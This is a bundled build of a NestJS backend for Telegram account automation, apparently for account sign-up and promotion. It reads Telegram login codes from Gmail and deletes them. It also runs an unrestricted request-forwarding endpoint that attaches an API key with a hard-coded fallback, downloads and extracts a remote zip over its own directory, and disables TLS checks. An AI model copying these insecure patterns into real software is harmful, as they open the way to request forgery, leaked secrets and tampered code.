/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./src/IMap/IMap.ts":
/*!**************************!*\
  !*** ./src/IMap/IMap.ts ***!
  \**************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.MailReader = void 0;
const imap_1 = __importDefault(__webpack_require__(/*! imap */ "imap"));
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils/index.ts");
const parseError_1 = __webpack_require__(/*! ../utils/parseError */ "./src/utils/parseError.ts");
class MailReader {
    constructor() {
        this.isReady = false;
        this.result = '';
        this.imap = new imap_1.default({
            user: process.env.GMAIL_ADD || '',
            password: process.env.GMAIL_PASS || '',
            host: 'imap.gmail.com',
            port: 993,
            tls: true,
            tlsOptions: {
                rejectUnauthorized: false,
            },
        });
        this.imap.on('ready', () => {
            console.log('Mail is Ready');
            this.isReady = true;
        });
        this.imap.on('error', (err) => {
            console.error('SomeError:', err);
            this.isReady = false;
        });
        this.imap.on('end', () => {
            console.log('Connection ended');
            this.isReady = false;
        });
    }
    static getInstance() {
        if (!MailReader.instance) {
            MailReader.instance = new MailReader();
        }
        return MailReader.instance;
    }
    async connectToMail() {
        console.log('Connecting to mail server');
        try {
            this.imap.connect();
            this.isReady = true;
            console.log('Connected to mail server');
        }
        catch (err) {
            console.error('Error connecting to mail server:', (0, parseError_1.parseError)(err));
            throw err;
        }
    }
    async disconnectFromMail() {
        console.log('Disconnecting from mail server');
        try {
            this.imap.end();
            this.isReady = false;
            console.log('Disconnected from mail server');
        }
        catch (err) {
            console.error('Error disconnecting from mail server:', (0, parseError_1.parseError)(err));
            throw err;
        }
    }
    async isMailReady() {
        return this.isReady;
    }
    async getCode() {
        console.log("MailReady : ", this.isReady);
        if (!this.isReady) {
            console.log("Re-Connecting mail server");
            await this.connectToMail();
            await (0, utils_1.sleep)(10000);
        }
        try {
            await this.openInbox();
            const searchCriteria = [['FROM', 'noreply@telegram.org']];
            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };
            console.log('Inbox Opened');
            const results = await new Promise((resolve, reject) => {
                this.imap.search(searchCriteria, (err, results) => {
                    if (err) {
                        console.error('Search error:', (0, parseError_1.parseError)(err));
                        reject(err);
                    }
                    else {
                        resolve(results);
                    }
                });
            });
            if (results.length > 0) {
                console.log('Emails found:', results.length);
                const length = results.length;
                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);
                await new Promise((resolve, reject) => {
                    fetch.on('message', (msg, seqno) => {
                        const emailData = [];
                        msg.on('body', (stream, info) => {
                            let buffer = '';
                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));
                            stream.on('end', () => {
                                if (info.which === 'TEXT') {
                                    emailData.push(buffer);
                                }
                                this.imap.seq.addFlags([seqno], '\\Deleted', (err) => {
                                    if (err)
                                        reject(err);
                                    this.imap.expunge((err) => {
                                        if (err)
                                            reject(err);
                                        console.log('Deleted message');
                                    });
                                });
                            });
                        });
                        msg.once('end', () => {
                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);
                            console.log('EmailDataLength:', emailData.length);
                            console.log('Mail:', emailData[emailData.length - 1].split('.'));
                            this.result = (0, utils_1.fetchNumbersFromString)(emailData[emailData.length - 1].split('.')[0]);
                            resolve();
                        });
                    });
                    fetch.once('end', () => {
                        console.log('Fetched mails');
                        resolve();
                    });
                });
            }
            else {
                console.log('No new emails found');
            }
            console.log('Returning result:', this.result);
            return this.result;
        }
        catch (error) {
            console.error('Error:', error);
            this.isReady = false;
            throw error;
        }
    }
    async openInbox() {
        await new Promise((resolve, reject) => {
            this.imap.openBox('INBOX', false, (err) => {
                if (err) {
                    console.error('Open Inbox error:', (0, parseError_1.parseError)(err));
                    reject(err);
                }
                else {
                    console.log('Inbox opened');
                    resolve();
                }
            });
        });
    }
}
exports.MailReader = MailReader;


/***/ }),

/***/ "./src/app.controller.ts":
/*!*******************************!*\
  !*** ./src/app.controller.ts ***!
  \*******************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var AppController_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const execute_request_dto_1 = __webpack_require__(/*! ./components/shared/dto/execute-request.dto */ "./src/components/shared/dto/execute-request.dto.ts");
const crypto_1 = __webpack_require__(/*! crypto */ "crypto");
const https = __importStar(__webpack_require__(/*! https */ "https"));
const url_1 = __webpack_require__(/*! url */ "url");
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils/index.ts");
let AppController = AppController_1 = class AppController {
    constructor() {
        this.logger = new utils_1.Logger(AppController_1.name);
        this.DEFAULT_TIMEOUT = 30000;
        this.MAX_CONTENT_SIZE = 50 * 1024 * 1024;
    }
    getHello() {
        return 'Hello World!';
    }
    async executeRequest(req, res) {
        const requestId = (0, crypto_1.randomUUID)();
        const startTime = Date.now();
        try {
            const { url, method = 'GET', headers = {}, data, params, responseType = 'json', timeout = this.DEFAULT_TIMEOUT, followRedirects = true, maxRedirects = 5 } = req;
            if (!url) {
                throw new common_1.HttpException('URL is required', common_1.HttpStatus.BAD_REQUEST);
            }
            try {
                const parsedUrl = new url_1.URL(url);
                if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
                    throw new common_1.HttpException('Invalid URL protocol. Only HTTP and HTTPS are supported.', common_1.HttpStatus.BAD_REQUEST);
                }
            }
            catch (error) {
                throw new common_1.HttpException('Invalid URL format', common_1.HttpStatus.BAD_REQUEST);
            }
            this.logger.log(`[${requestId}] Starting HTTP ${method} request to ${url}`);
            const httpsAgent = new https.Agent({
                rejectUnauthorized: true
            });
            const response = await (0, axios_1.default)({
                url,
                method,
                headers: {
                    ...headers,
                    'x-api-key': process.env.X_API_KEY || 'santoor',
                },
                data,
                params,
                responseType,
                timeout,
                maxRedirects: followRedirects ? maxRedirects : 0,
                maxContentLength: this.MAX_CONTENT_SIZE,
                maxBodyLength: this.MAX_CONTENT_SIZE,
                validateStatus: null,
                decompress: true,
                httpsAgent,
                transitional: {
                    clarifyTimeoutError: true
                }
            });
            const executionTime = Date.now() - startTime;
            this.logger.log(`[${requestId}] Completed in ${executionTime}ms with status ${response.status}`);
            Object.entries(response.headers).forEach(([key, value]) => {
                if (key.toLowerCase() === 'transfer-encoding')
                    return;
                if (Array.isArray(value)) {
                    res.setHeader(key, value);
                }
                else if (value) {
                    res.setHeader(key, value.toString());
                }
            });
            res.status(response.status);
            if (this.isBinaryResponse(responseType, response.headers['content-type'])) {
                if (!res.getHeader('content-type') && response.headers['content-type']) {
                    res.setHeader('content-type', response.headers['content-type']);
                }
                res.send(Buffer.from(response.data));
            }
            else {
                res.send(response.data);
            }
            return;
        }
        catch (error) {
            const executionTime = Date.now() - startTime;
            (0, utils_1.parseError)(error, `Failed to Execute Request: ${req.url} | Method: ${req.method?.toUpperCase()}`);
            this.logger.error({
                message: `[${requestId}] Request failed after ${executionTime}ms`,
                requestId,
                request: {
                    url: req.url,
                    method: req.method || 'GET',
                    params: req.params,
                    headers: this.sanitizeHeaders(req.headers || {}),
                    timeout: req.timeout || this.DEFAULT_TIMEOUT,
                    responseType: req.responseType || 'json'
                },
                error: {
                    name: error.name,
                    message: error.message,
                    stack: error.stack,
                    code: error.code,
                    status: error.response?.status,
                    responseData: error.response?.data
                }
            });
            const errorDetails = this.handleRequestError(error, requestId);
            res.status(errorDetails.status || common_1.HttpStatus.INTERNAL_SERVER_ERROR);
            res.send(errorDetails);
            return;
        }
    }
    sanitizeHeaders(headers) {
        const sensitiveHeaders = ['authorization', 'cookie', 'proxy-authorization'];
        const sanitized = { ...headers };
        sensitiveHeaders.forEach(header => {
            Object.keys(sanitized).forEach(key => {
                if (key.toLowerCase() === header.toLowerCase()) {
                    sanitized[key] = '[REDACTED]';
                }
            });
        });
        return sanitized;
    }
    isBinaryResponse(responseType, contentType) {
        if (responseType === 'arraybuffer')
            return true;
        if (contentType) {
            const binaryTypes = [
                'application/octet-stream',
                'image/',
                'audio/',
                'video/',
                'application/pdf',
                'application/zip',
                'application/x-zip-compressed',
                'application/binary'
            ];
            return binaryTypes.some(type => contentType.toLowerCase().includes(type.toLowerCase()));
        }
        return false;
    }
    handleRequestError(error, requestId) {
        if (axios_1.default.isAxiosError(error)) {
            const axiosError = error;
            if (axiosError.code === 'ECONNABORTED') {
                return {
                    status: common_1.HttpStatus.GATEWAY_TIMEOUT,
                    error: 'Request timeout',
                    message: 'The request took too long to complete',
                    requestId
                };
            }
            if (axiosError.code === 'ECONNREFUSED') {
                return {
                    status: common_1.HttpStatus.BAD_GATEWAY,
                    error: 'Connection refused',
                    message: 'Could not connect to the target server',
                    requestId
                };
            }
            if (axiosError.response) {
                return {
                    status: axiosError.response.status,
                    headers: this.sanitizeHeaders(axiosError.response.headers),
                    data: axiosError.response.data,
                    requestId
                };
            }
            if (axiosError.request) {
                return {
                    status: common_1.HttpStatus.BAD_GATEWAY,
                    error: 'No response',
                    message: 'The request was made but no response was received',
                    code: axiosError.code,
                    requestId
                };
            }
            return {
                status: common_1.HttpStatus.BAD_GATEWAY,
                error: axiosError.code || 'Request failed',
                message: axiosError.message,
                requestId
            };
        }
        return {
            status: common_1.HttpStatus.INTERNAL_SERVER_ERROR,
            error: 'Internal server error',
            message: error.message || 'An unexpected error occurred',
            requestId
        };
    }
};
exports.AppController = AppController;
__decorate([
    (0, common_1.Get)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", String)
], AppController.prototype, "getHello", null);
__decorate([
    (0, common_1.Post)('execute-request'),
    (0, swagger_1.ApiOperation)({
        summary: 'Execute an HTTP request with given details',
        description: 'Makes an HTTP request to the specified URL with provided configuration and returns the response'
    }),
    (0, swagger_1.ApiResponse)({ status: 201, description: 'Request executed successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid request parameters' }),
    (0, swagger_1.ApiResponse)({ status: 429, description: 'Too many requests' }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal server error or request execution failed' }),
    __param(0, (0, common_1.Body)(new common_1.ValidationPipe({
        transform: true,
        forbidNonWhitelisted: true,
        whitelist: true
    }))),
    __param(1, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [execute_request_dto_1.ExecuteRequestDto, Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "executeRequest", null);
exports.AppController = AppController = AppController_1 = __decorate([
    (0, swagger_1.ApiTags)('App'),
    (0, common_1.Controller)(),
    __metadata("design:paramtypes", [])
], AppController);


/***/ }),

/***/ "./src/app.module.ts":
/*!***************************!*\
  !*** ./src/app.module.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const users_module_1 = __webpack_require__(/*! ./components/users/users.module */ "./src/components/users/users.module.ts");
const user_data_module_1 = __webpack_require__(/*! ./components/user-data/user-data.module */ "./src/components/user-data/user-data.module.ts");
const client_module_1 = __webpack_require__(/*! ./components/clients/client.module */ "./src/components/clients/client.module.ts");
const Telegram_module_1 = __webpack_require__(/*! ./components/Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ./components/buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ./components/active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const init_module_1 = __webpack_require__(/*! ./components/ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ./components/channels/channels.module */ "./src/components/channels/channels.module.ts");
const app_controller_1 = __webpack_require__(/*! ./app.controller */ "./src/app.controller.ts");
const logger_middleware_1 = __webpack_require__(/*! ./middlewares/logger.middleware */ "./src/middlewares/logger.middleware.ts");
const build_module_1 = __webpack_require__(/*! ./components/builds/build.module */ "./src/components/builds/build.module.ts");
const upi_ids_module_1 = __webpack_require__(/*! ./components/upi-ids/upi-ids.module */ "./src/components/upi-ids/upi-ids.module.ts");
const promote_msgs_module_1 = __webpack_require__(/*! ./components/promote-msgs/promote-msgs.module */ "./src/components/promote-msgs/promote-msgs.module.ts");
const stat_module_1 = __webpack_require__(/*! ./components/stats/stat.module */ "./src/components/stats/stat.module.ts");
const stat2_module_1 = __webpack_require__(/*! ./components/stats2/stat2.module */ "./src/components/stats2/stat2.module.ts");
const promote_stat_module_1 = __webpack_require__(/*! ./components/promote-stats/promote-stat.module */ "./src/components/promote-stats/promote-stat.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ./components/promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
const tg_signup_module_1 = __webpack_require__(/*! ./components/TgSignup/tg-signup.module */ "./src/components/TgSignup/tg-signup.module.ts");
const transaction_module_1 = __webpack_require__(/*! ./components/transactions/transaction.module */ "./src/components/transactions/transaction.module.ts");
const npoint_module_1 = __webpack_require__(/*! ./components/n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const timestamp_module_1 = __webpack_require__(/*! ./components/timestamps/timestamp.module */ "./src/components/timestamps/timestamp.module.ts");
const dynamic_data_module_1 = __webpack_require__(/*! ./components/dynamic-data/dynamic-data.module */ "./src/components/dynamic-data/dynamic-data.module.ts");
const session_manager_1 = __webpack_require__(/*! ./components/session-manager */ "./src/components/session-manager/index.ts");
const ip_management_module_1 = __webpack_require__(/*! ./components/ip-management/ip-management.module */ "./src/components/ip-management/ip-management.module.ts");
const core_1 = __webpack_require__(/*! @nestjs/core */ "@nestjs/core");
const guards_1 = __webpack_require__(/*! ./guards */ "./src/guards/index.ts");
const components_1 = __webpack_require__(/*! ./components */ "./src/components/index.ts");
const interceptors_1 = __webpack_require__(/*! ./interceptors */ "./src/interceptors/index.ts");
let AppModule = class AppModule {
    configure(consumer) {
        consumer.apply(logger_middleware_1.LoggerMiddleware).forRoutes('*');
    }
};
exports.AppModule = AppModule;
exports.AppModule = AppModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            Telegram_module_1.TelegramModule,
            components_1.BotsModule,
            active_channels_module_1.ActiveChannelsModule,
            client_module_1.ClientModule,
            session_manager_1.SessionModule,
            ip_management_module_1.IpManagementModule,
            user_data_module_1.UserDataModule,
            users_module_1.UsersModule,
            buffer_client_module_1.BufferClientModule,
            channels_module_1.ChannelsModule,
            promote_client_module_1.PromoteClientModule,
            build_module_1.BuildModule,
            upi_ids_module_1.UpiIdModule,
            promote_msgs_module_1.PromoteMsgModule,
            promote_stat_module_1.PromoteStatModule,
            stat_module_1.StatModule,
            stat2_module_1.Stat2Module,
            tg_signup_module_1.TgSignupModule,
            transaction_module_1.TransactionModule,
            npoint_module_1.NpointModule,
            timestamp_module_1.TimestampModule,
            dynamic_data_module_1.DynamicDataModule,
        ],
        providers: [
            {
                provide: core_1.APP_GUARD,
                useClass: guards_1.AuthGuard,
            },
            {
                provide: core_1.APP_FILTER,
                useClass: interceptors_1.ExceptionsFilter
            },
        ],
        controllers: [app_controller_1.AppController],
        exports: [
            Telegram_module_1.TelegramModule,
            active_channels_module_1.ActiveChannelsModule,
            client_module_1.ClientModule,
            user_data_module_1.UserDataModule,
            users_module_1.UsersModule,
            buffer_client_module_1.BufferClientModule,
            channels_module_1.ChannelsModule,
            promote_client_module_1.PromoteClientModule,
            tg_signup_module_1.TgSignupModule,
            transaction_module_1.TransactionModule,
            timestamp_module_1.TimestampModule,
        ]
    })
], AppModule);


/***/ }),

/***/ "./src/cloudinary.ts":
/*!***************************!*\
  !*** ./src/cloudinary.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CloudinaryService = void 0;
const cloudinary = __importStar(__webpack_require__(/*! cloudinary */ "cloudinary"));
const path = __importStar(__webpack_require__(/*! path */ "path"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const adm_zip_1 = __importDefault(__webpack_require__(/*! adm-zip */ "adm-zip"));
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
class CloudinaryService {
    constructor() {
        this.resources = new Map();
        cloudinary.v2.config({
            cloud_name: process.env.CL_NAME,
            api_key: process.env.CL_APIKEY,
            api_secret: process.env.CL_APISECRET
        });
    }
    static async getInstance(name) {
        if (!CloudinaryService.instance) {
            CloudinaryService.instance = new CloudinaryService();
        }
        await CloudinaryService.instance.getResourcesFromFolder(name);
        return CloudinaryService.instance;
    }
    async downloadAndExtractZip(url) {
        const rootPath = process.cwd();
        const zipPath = path.resolve(rootPath, 'temp.zip');
        const extractPath = path.resolve(rootPath);
        console.log(`Starting download of zip file from ${url}`);
        const response = await (0, fetchWithTimeout_1.fetchWithTimeout)(url, { responseType: 'arraybuffer' });
        if (response?.status === 200) {
            console.log('Zip file downloaded successfully.');
            fs.writeFileSync(zipPath, response.data);
            console.log(`Zip file saved to ${zipPath}`);
            const zip = new adm_zip_1.default(zipPath);
            console.log(`Extracting zip file to ${extractPath}`);
            zip.extractAllTo(extractPath, true);
            console.log('Zip file extracted successfully.');
            fs.unlinkSync(zipPath);
            console.log(`Temporary zip file ${zipPath} deleted.`);
        }
        else {
            const errorMessage = `Unable to download zip file from ${url}`;
            console.error(errorMessage);
            throw new Error(errorMessage);
        }
    }
    async getResourcesFromFolder(folderName) {
        console.log('FETCHING NEW FILES!! from CLOUDINARY');
        await this.downloadAndExtractZip(`https://cms.paidgirl.site/folders/${folderName}/files/download-all`);
    }
    async createNewFolder(folderName) {
        await this.createFolder(folderName);
        await this.uploadFilesToFolder(folderName);
    }
    async overwriteFile() {
        const cloudinaryFileId = "index_nbzca5.js";
        const localFilePath = "./src/test.js";
        try {
            const result = await cloudinary.v2.uploader.upload(localFilePath, {
                resource_type: 'auto',
                overwrite: true,
                invalidate: true,
                public_id: cloudinaryFileId
            });
            console.log('File overwritten successfully:', result);
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    async findAndSaveResources(folderName, type) {
        try {
            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });
            await Promise.all(resources.map(async (resource) => {
                try {
                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);
                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);
                }
                catch (error) {
                    console.log("Error in saving file from cloudinary");
                    (0, parseError_1.parseError)(error);
                }
            }));
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    async createFolder(folderName) {
        try {
            const result = await cloudinary.v2.api.create_folder(folderName);
            return result;
        }
        catch (error) {
            console.error('Error creating folder:', error);
            throw error;
        }
    }
    async uploadFilesToFolder(folderName) {
        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {
            try {
                const result = await cloudinary.v2.uploader.upload_large(url, {
                    folder: folderName,
                    resource_type: 'auto',
                    public_id: key,
                });
                return result;
            }
            catch (error) {
                console.error('Error uploading file:', error);
                throw error;
            }
        });
        try {
            return await Promise.all(uploadPromises);
        }
        catch (error) {
            console.error('Error uploading files:', error);
            throw error;
        }
    }
    async printResources() {
        try {
            this.resources?.forEach((val, key) => {
                console.log(key, ":", val);
            });
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    get(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
    getBuffer(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            console.log("Error in getting buffer");
        }
    }
}
exports.CloudinaryService = CloudinaryService;
async function saveFile(url, name) {
    try {
        const extension = url.substring(url.lastIndexOf('.') + 1);
        const rootPath = process.cwd();
        const mypath = path.join(rootPath, `${name}.${extension}`);
        console.log(`Downloading file: ${mypath}`);
        const res = await (0, fetchWithTimeout_1.fetchWithTimeout)(url, { responseType: 'arraybuffer' }, 2);
        if (res?.statusText === 'OK') {
            if (!fs.existsSync(mypath)) {
                fs.writeFileSync(mypath, res.data, 'binary');
                console.log(`${name}.${extension} Saved!!`);
            }
            else {
                fs.unlinkSync(mypath);
                fs.writeFileSync(mypath, res.data, 'binary');
                console.log(`${name}.${extension} Replaced!!`);
            }
        }
        else {
            throw new Error(`Unable to download file from ${url}`);
        }
    }
    catch (err) {
        (0, parseError_1.parseError)(err);
    }
}


/***/ }),

/***/ "./src/components/ConfigurationInit/configuration.schema.ts":
/*!******************************************************************!*\
  !*** ./src/components/ConfigurationInit/configuration.schema.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationSchema = exports.Configuration = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Configuration = class Configuration {
};
exports.Configuration = Configuration;
exports.Configuration = Configuration = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Configuration);
exports.ConfigurationSchema = mongoose_1.SchemaFactory.createForClass(Configuration);
exports.ConfigurationSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/ConfigurationInit/index.ts":
/*!***************************************************!*\
  !*** ./src/components/ConfigurationInit/index.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./configuration.schema */ "./src/components/ConfigurationInit/configuration.schema.ts"), exports);
__exportStar(__webpack_require__(/*! ./init.controller */ "./src/components/ConfigurationInit/init.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./init.module */ "./src/components/ConfigurationInit/init.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts"), exports);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.controller.ts":
/*!*************************************************************!*\
  !*** ./src/components/ConfigurationInit/init.controller.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const init_service_1 = __webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts");
const decorators_1 = __webpack_require__(/*! ../../decorators */ "./src/decorators/index.ts");
const interceptors_1 = __webpack_require__(/*! ../../interceptors */ "./src/interceptors/index.ts");
let ConfigurationController = class ConfigurationController {
    constructor(configurationService) {
        this.configurationService = configurationService;
    }
    async findOne() {
        return this.configurationService.findOne();
    }
    async update(updateClientDto) {
        return this.configurationService.update(updateClientDto);
    }
};
exports.ConfigurationController = ConfigurationController;
__decorate([
    (0, common_1.Get)(),
    (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
    (0, decorators_1.CloudflareCache)(3600, 60),
    (0, swagger_1.ApiOperation)({ summary: 'Get configuration data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
